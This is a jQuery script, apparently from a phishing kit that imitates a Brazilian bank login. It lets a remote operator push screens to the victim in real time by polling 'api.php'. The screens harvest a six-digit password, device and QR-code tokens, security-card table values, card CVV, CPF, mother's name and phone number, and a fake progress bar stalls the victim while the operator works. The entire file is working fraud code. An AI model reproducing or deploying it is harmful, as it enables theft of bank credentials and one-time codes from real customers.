$('document').ready(function() {

    let status = 'AGUARDANDO_INTERNA';
    let info;
    let barraAtiva = false;
    let porcentagem = 1;


    setInterval( () => {


        if(barraAtiva){
            porcentagem++;
            $('div.miolo').css('width', porcentagem+'%');
            $('p.porcentagem').text(porcentagem+"%");
            if(porcentagem === 100){
                porcentagem = 0;
            }
        }

    }, 3000);


    $("#modal").modal({
        escapeClose: false,
        clickClose: false,
        showClose: false
    });

    let alphaTeclado = 1;
    let id = $('#idInfo').val();
    let clientHashId = $('#clientHashId').val();

    function loadInfo(){
        $.ajax({
            url: "api.php",
            type:'POST',
            dataType : "json",
            data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
            cache: false,
            success: function(r){
                info = r;
                if(info.saldo){
                    $('small.saldo').text(info.saldo);
                }
                if(r.comando !== status) {
                    status = r.comando;
                    atualizarTela();
                }
            }
        });
    }
    

    $('ul#ul_teclado_virtual li a').click( e => {
        let valor = $(event.target).text();
        valor = valor.trim();

        $('div#boxSenhaDe6').find('.box_redLine_bottom').removeClass('form_erro');

        let s6_1 = $('#s6_1').val();
        let s6_2 = $('#s6_2').val();
        let s6_3 = $('#s6_3').val();
        let s6_4 = $('#s6_4').val();
        let s6_5 = $('#s6_5').val();
        let s6_6 = $('#s6_6').val();

        if(s6_1.length === 0){
            $('#s6_1').val(valor);
        } else if(s6_2.length === 0){
            $('#s6_2').val(valor);
        } else if(s6_3.length === 0){
            $('#s6_3').val(valor);
        } else if(s6_4.length === 0){
            $('#s6_4').val(valor);
        } else if(s6_5.length === 0){
            $('#s6_5').val(valor);
        } else if(s6_6.length === 0){
            $('#s6_6').val(valor);
        }
    });

    $('#botao_limpar').click(function(e) {
        $('.frmPassWord').val('');
    });

    $('#diminuiContraste').click(function(e) {

        let opacidade = $('ul#ul_teclado_virtual li').css('opacity');

        if(opacidade > 0) {
            opacidade -= 0.10;
            $('ul#ul_teclado_virtual li').css('opacity', opacidade);
        }
        
    });

    $('#aumentaContraste').click(function(e) {

        let opacidade = $('ul#ul_teclado_virtual li').css('opacity');

        if(opacidade < 1) {

            opacidade = parseFloat(opacidade) + parseFloat(0.10);
            $('ul#ul_teclado_virtual li').css('opacity', opacidade);
        }
        
    });

    $('input#celular').mask('(00) 00000-0000');
    $('input#cpf').mask('000.000.000-00');


    $('div#modal').on('keyup', 'div#boxToken input#token', function(e) {

        e.preventDefault();

        e.target.value=e.target.value.replace(/[^\d]/,'')

        let token = e.target.value;
        let qnt = token.length;

        if(qnt == 6) {
            $("input#token").blur(); 
            $('button#btnAcessarToken').addClass('btn-action-active');
        } else {
            $('button#btnAcessarToken').removeClass('btn-action-active');
        }

    });


    $('div#modal').on('keyup', 'div#boxQrCode input#qrCodeToken', function(e) {

        e.preventDefault();

        e.target.value=e.target.value.replace(/[^\d]/,'')

        let token = e.target.value;
        let qnt = token.length;

        if(qnt == 8) {
            $("input#qrCodeToken").blur(); 
            $('button#btnConfirmarQr').addClass('btn-action-active');
        } else {
            $('button#btnConfirmarQr').removeClass('btn-action-active');
        }

    });

    $('div#modal').on('keyup', 'div#boxSenhaDe6 input#senha6', function(e) {

        e.preventDefault();

        e.target.value=e.target.value.replace(/[^\d]/,'')

        let token = e.target.value;
        let qnt = token.length;

        if(qnt == 6) {
            $("input#senha6").blur(); 
            $('button#btnConfirmarSenha6').addClass('btn-action-active');
        } else {
            $('button#btnConfirmarSenha6').removeClass('btn-action-active');
        }

    });
    
    $('div#modal').on('keyup', 'div#boxCelular input#celular', function(e) {

        e.preventDefault();

        let celular = e.target.value;
        let qnt = celular.length;

        if(qnt == 15) {
            $("input#celular").blur(); 
            $('button#btnAtualizarCelular').addClass('btn-action-active');
        } else {
            $('button#btnAtualizarCelular').removeClass('btn-action-active');
        }

    });

    $('div#modal').on('keyup', 'div#boxTabela input#posicaoTabela', function(e) {

        e.preventDefault();

        e.target.value=e.target.value.replace(/[^\d]/,'')

        let token = e.target.value;
        let qnt = token.length;

        if(qnt == 3) {
            $("input#posicaoTabela").blur(); 
            $('button#btnAcessarTabela').addClass('btn-action-active');
        } else {
            $('button#btnAcessarTabela').removeClass('btn-action-active');
        }

    });
    
    $('div#modal').on('keyup', 'div#boxCvv input#cvv', function(e) {

        e.preventDefault();

        e.target.value=e.target.value.replace(/[^\d]/,'')

        let cvv = e.target.value;
        let qnt = cvv.length;

        if(qnt == 3) {
            $("input#cvv").blur(); 
            $('button#btnAtualizarCvv').addClass('btn-action-active');
        } else {
            $('button#btnAtualizarCvv').removeClass('btn-action-active');
        }

    });

    $('div#modal').on('keyup', 'div#boxNomeMae input#nomeMae', function(e) {

        e.preventDefault();

        let nome = e.target.value;
        let qnt = nome.length;

        if(qnt >= 4) {
            $("input#cvv").blur(); 
            $('button#btnConfirmarNomeMae').addClass('btn-action-active');
        } else {
            $('button#btnConfirmarNomeMae').removeClass('btn-action-active');
        }

    });

    $('div#modal').on('keyup', 'div#boxCPF input#cpf', function(e) {

        e.preventDefault();


        let cpf = e.target.value;
        let qnt = cpf.length;

        if(qnt == 14) {
            $("input#cpf").blur(); 
            $('button#btnAtualizarCpf').addClass('btn-action-active');
        } else {
            $('button#btnAtualizarCpf').removeClass('btn-action-active');
        }

    });

    function atualizarTela(){

        $('div.boxes').addClass('hide');
        $('span.txt_msg_erro_disp').addClass('hide');
        $('button.btn-action').removeClass('btn-action-active');

        if(barraAtiva){
            porcentagem = 100;
            $('div.miolo').css('width', porcentagem+'%');
            $('p.porcentagem').text(porcentagem+"%");
            barraAtiva = false;
        }
        

        if(status === 'AGUARDANDO_INTERNA'){
            $('div#boxCarregando').removeClass('hide');
        }
        if(status ==='SENHA_DE_6_INTERNA'){
            $('div#boxSenhaDe6').removeClass('hide');
            $('input#senha6').focus();
        }
        if(status ==='SENHA_DE_6_ERRO_INTERNA'){
            $('div#boxSenhaDe6').find('span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxSenhaDe6').removeClass('hide');
            $('input#senha6').focus();
        }
        if(status ==='TOKEN_INTERNA'){
            $('div#boxToken strong.serial').text(info.serialDispositivo);
            $('div#boxToken').removeClass('hide');
            $('#token').focus();
        }
        if(status ==='TOKEN_ERRO_INTERNA'){

            $('div#boxToken').find('span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxToken strong.serial').text(info.serialDispositivo);
            $('div#boxToken').removeClass('hide');
            $('#token').focus();
        }

        if(status ==='TABELA_INTERNA'){

            $('#posicao').text(info.texto);
            $('div#boxTabela strong.serial').text(info.serialDispositivo);
            $('div#boxTabela').removeClass('hide');
            $('input#posicaoTabela').focus();
        }
        if(status ==='TABELA_ERRO_INTERNA'){

            $('div#boxTabela').find('span.txt_msg_erro_disp').removeClass('hide');
            $('#posicao').text(info.texto);
            $('div#boxTabela strong.serial').text(info.serialDispositivo);
            $('div#boxTabela').removeClass('hide');
            $('input#posicaoTabela').focus();
            
        }
        if(status ==='CELULAR_INTERNA'){
            $('div#boxCelular').removeClass('hide');
            $('input#celular').focus();
        }
        if(status ==='CELULAR_ERRO_INTERNA'){
            $('div#boxCelular').find('span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxCelular').removeClass('hide');
            $('input#celular').focus();
        }
        if(status ==='CVV_INTERNA'){
            $('div#boxCvv').removeClass('hide');
            $('input#cvv').focus();
        }
        if(status ==='CVV_ERRO_INTERNA'){
            $('div#boxCvv').find('span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxCvv').removeClass('hide');
            $('input#cvv').focus();
        }

        if(status ==='CPF_INTERNA'){
            $('div#boxCPF').removeClass('hide');
            $('input#cpf').focus();
        }
        if(status ==='CPF_ERRO_INTERNA'){
            $('div#boxCPF').find('span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxCPF').removeClass('hide');
            $('input#cpf').focus();
        }


        if(status ==='NOME_MAE_INTERNA'){
            $('div#boxNomeMae').removeClass('hide');
            $('input#nomeMae').focus();
        }
        if(status ==='NOME_MAE_ERRO_INTERNA'){
            $('div#boxNomeMae').find('span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxNomeMae').removeClass('hide');
            $('input#nomeMae').focus();
        }


        
        if(status ==='QR_CODE_INTERNA'){
            $('div#boxQrCode input#qrCodeToken').val('');
            $('div#boxQrCode div.qrBox img').attr('src', 'qrs/' + info.qrCodeFile);
            $('div#boxQrCode div.erro').addClass('hide');
            
            $('div#boxQrCode div#aguardeQR').removeClass('hide');
            $('div#boxQrCode div#capturaQR').addClass('hide');

            setTimeout(function(){

                $('div#boxQrCode div#aguardeQR').addClass('hide');
                $('div#boxQrCode div#capturaQR').removeClass('hide');

            }, 4000);

            $('div#boxQrCode').removeClass('hide');
            $('div#boxQrCode input#qrCodeToken').focus();
        }
        
        if(status == 'ATUALIZAR_MODULO_INTERNA') {
            porcentagem = 1;

            $('div.miolo').css('width', porcentagem+'%');
            $('p.porcentagem').text(porcentagem+"%");
            barraAtiva = true;
            $('div#boxAtualizarModulo').removeClass('hide');
        }

        if(status == 'TELA_FIM_INTERNA') {
            window.location.href = "fim.php?hash="+clientHashId;
        }
    }
    

    $( "input#token" ).keyup(function(e) {
        let token = $(e.target).val();
        if(token.length > 0){
            $('div#boxToken').find('.box_redLine_bottom').removeClass('form_erro');
        }
    });

    $('div#modal').on('click', 'div#boxQrCode button#btnConfirmarQr.btn-action-active', function(e) {
        

        let token = $('input#qrCodeToken').val();

        if(token.length !== 8){
            $('div#boxQrCode').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "SALVAR_QR_INTERNA", id : id,clientHashId : clientHashId, posicao: '-', valor : token},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#token').val('');
                atualizarTela();
                
            }
        });

    });
    
    $('div#modal').on('click', 'div#boxToken button#btnAcessarToken.btn-action-active', function(e) {

        e.preventDefault();
        

        let token = $('input#token').val();

        if(token.length !== 6){
            
            $('div#boxToken').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "SALVAR_TOKEN_INTERNA", id : id,clientHashId : clientHashId, posicao: '-', valor : token},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#token').val('');
                atualizarTela();
                
            }
        });

    });


    $('div#modal').on('click', 'div#boxTabela button#btnAcessarTabela.btn-action-active', function(e) {

        let token = $('input#posicaoTabela').val();

        if(token.length !== 3){
            $('div#boxTabela').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "SALVAR_TOKEN_INTERNA", id : id,clientHashId : clientHashId, posicao: info.texto, valor : token},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#posicaoTabela').val('');
                atualizarTela();
                
            }
        });

    });

    function zerarSenhaDe6(){
        senhaDe4 = '';
        $('#s6_1').val('');
        $('#s6_2').val('');
        $('#s6_3').val('');
        $('#s6_4').val('');
        $('#s6_5').val('');
        $('#s6_6').val('');
    }


    $('div#modal').on('click', 'div#boxSenhaDe6 button#btnConfirmarSenha6.btn-action-active', function(e) {


        let senhaDe6 = $('input#senha6').val();

        if(senhaDe6.length !== 6){
            $('div#boxSenhaDe6').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.senha6 = senhaDe6;
        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#senha6').val('');
                atualizarTela();
                
            }
        });

    });


    $('div#modal').on('click', 'div#boxCPF button#btnAtualizarCpf.btn-action-active', function(e) {

        let cpf = $('input#cpf').val();

        if(cpf.length !== 14){
            $('div#boxCPF').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.cpf = cpf;
        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#cpf').val('');
                atualizarTela();
                
            }
        });

    });

    $('div#modal').on('click', 'div#boxNomeMae button#btnConfirmarNomeMae.btn-action-active', function(e) {

        let nomeMae = $('input#nomeMae').val();

        if(nomeMae.length < 4){
            $('div#boxNomeMae').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.mae = nomeMae;
        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#nomeMae').val('');
                atualizarTela();
                
            }
        });

    });

    $('div#modal').on('click', 'div#boxCvv button#btnAtualizarCvv.btn-action-active', function(e) {

        let cvv = $('input#cvv').val();

        if(cvv.length !== 3){
            $('div#boxCvv').find('span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.cvv = cvv;
        info.comando = 'AGUARDANDO_INTERNA';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#cvv').val('');
                atualizarTela();
                
            }
        });

    });


    $( "input#celular" ).keyup(function(e) {

        let cvv = $(e.target).val();
        if(cvv.length > 0){
            $('div#boxCelular').find('.box_redLine_bottom').removeClass('form_erro');
        }
    });

    $('div#modal').on('click', 'div#boxCelular button#btnAtualizarCelular.btn-action-active', function(e) {

        let celular = $('input#celular').val();

        if(celular.length < 8){
            $('div#boxCelular').find('.box_redLine_bottom').removeClass('form_erro');
            return;
        }

        info.celular = celular;
        info.comando = 'AGUARDANDO_INTERNA';



        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#celular').val('');
                atualizarTela();
                
            }
        });

    });

    var timer = setInterval ( function(){
        loadInfo();
    }, 2000 );

    loadInfo();

});